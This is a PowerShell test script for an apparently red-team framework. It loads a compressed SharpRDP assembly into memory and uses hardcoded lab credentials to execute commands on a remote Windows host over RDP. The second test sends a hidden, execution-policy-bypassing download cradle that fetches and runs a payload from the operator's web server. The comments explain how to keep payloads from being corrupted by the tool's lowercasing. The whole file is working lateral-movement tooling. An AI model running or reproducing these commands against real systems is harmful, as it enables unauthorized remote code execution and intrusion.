# TestSharpRDPDirect.ps1
# Tests SharpRDP independently of Amnesiac to isolate execution issues.
#
# Root cause discovered: SharpRDP.RunRun calls this.cmd.ToLower() before SendText().
# This corrupts base64 payloads. Also, the 'arguments=' field is silently ignored --
# only 'command=' is used. Fix: use all-lowercase download cradle as the command value,
# passed directly to [SharpRDP.Program]::Main() to avoid Invoke-SharpRDP's Split(" ").
#
# Test 1 -- basic execution: write a file (command is all-lowercase, ToLower-safe)
# Test 2 -- download cradle via serve: serve must be running at http://operatorIP:8080/
#
# Usage: .\Tests\TestSharpRDPDirect.ps1
# Prereq: run from Amnesiac-main directory so Tools\ is found

param(
    [string]$Target      = "10.3.10.22",
    [string]$Username    = "NORTH\hodor",
    [string]$Password    = "hodor",
    [string]$OperatorIP  = "10.3.10.157",
    [string]$PipePayload = "pipe_test.ps1"
)

$root = Split-Path -Parent $PSScriptRoot

# Load SharpRDP assembly from gzip+b64 blob in Invoke-SharpRDP.ps1
function Load-SharpRDP {
    if ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'SharpRDP' }) {
        Write-Host "[*] SharpRDP already loaded." -ForegroundColor Cyan
        return
    }
    $src  = [System.IO.File]::ReadAllText("$root\Tools\Invoke-SharpRDP.ps1")
    $m    = [regex]::Match($src, '"(H4sI[A-Za-z0-9+/=]{100,})"')
    if (-not $m.Success) { Write-Host "[-] Cannot find gzip blob in Invoke-SharpRDP.ps1" -ForegroundColor Red; return }
    $ms1  = New-Object IO.MemoryStream(,[Convert]::FromBase64String($m.Groups[1].Value))
    $gz   = New-Object IO.Compression.GzipStream($ms1,[IO.Compression.CompressionMode]::Decompress)
    $ms2  = New-Object IO.MemoryStream; $gz.CopyTo($ms2); $gz.Close(); $ms1.Close()
    [System.Reflection.Assembly]::Load($ms2.ToArray()) | Out-Null
    Write-Host "[+] SharpRDP assembly loaded." -ForegroundColor Green
}

function Run-SRDPDirect {
    param([string]$Label, [string]$Command)
    Write-Host ""
    Write-Host "[*] $Label" -ForegroundColor Cyan
    Write-Host "    command (after ToLower): $($Command.ToLower())" -ForegroundColor DarkGray
    [SharpRDP.Program]::Main(@(
        "computername=$Target",
        "username=$Username",
        "password=$Password",
        "command=$Command"
    ))
}

Load-SharpRDP

# ---------------------------------------------------------------------------
# Test 1: file write -- command is all-lowercase so ToLower doesn't corrupt it
# ---------------------------------------------------------------------------
$marker   = "srp_exec_$(Get-Random)"
$testFile = "c:\windows\temp\srp_test.txt"

Run-SRDPDirect -Label "Test 1: file write (no network)" `
    -Command "[io.file]::writealltext('$testFile','$marker')"

Write-Host "    [*] Waiting 12s..." -ForegroundColor Yellow
Start-Sleep 12

Write-Host "    [*] Checking \\$Target\C`$\Windows\Temp\srp_test.txt via SMB..." -ForegroundColor Cyan
try {
    $got = Get-Content "\\$Target\C`$\Windows\Temp\srp_test.txt" -ErrorAction Stop
    if ($got -match $marker) {
        Write-Host "    [+] PASS: marker matched -- PS execution via SharpRDP works" -ForegroundColor Green
    } else {
        Write-Host "    [~] File exists but content='$got', expected='$marker'" -ForegroundColor Yellow
        Write-Host "        (stale file from a previous run?)" -ForegroundColor DarkYellow
    }
} catch {
    Write-Host "    [-] Cannot read file: $_" -ForegroundColor Red
    Write-Host "    Note: check manually via RDP as hodor and look for $testFile" -ForegroundColor DarkYellow
}

# ---------------------------------------------------------------------------
# Test 2: download cradle -- serve must be running at http://OperatorIP:8080/
# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "[*] Test 2: download cradle (requires serve + pipe payload at http://${OperatorIP}:8080/$PipePayload)" -ForegroundColor Cyan
Write-Host "    Create the pipe_test.ps1 file on your serve root before running this test." -ForegroundColor DarkYellow

$cradleCmd = "powershell -nop -ep bypass -w hidden -c `"iex(new-object net.webclient).downloadstring('http://${OperatorIP}:8080/$PipePayload')`""
Run-SRDPDirect -Label "Test 2: download cradle" -Command $cradleCmd

Write-Host "    [*] Waiting 20s for target to download and execute..." -ForegroundColor Yellow
Start-Sleep 20
Write-Host "    [*] Check pipe connection or file artifacts to confirm." -ForegroundColor Cyan
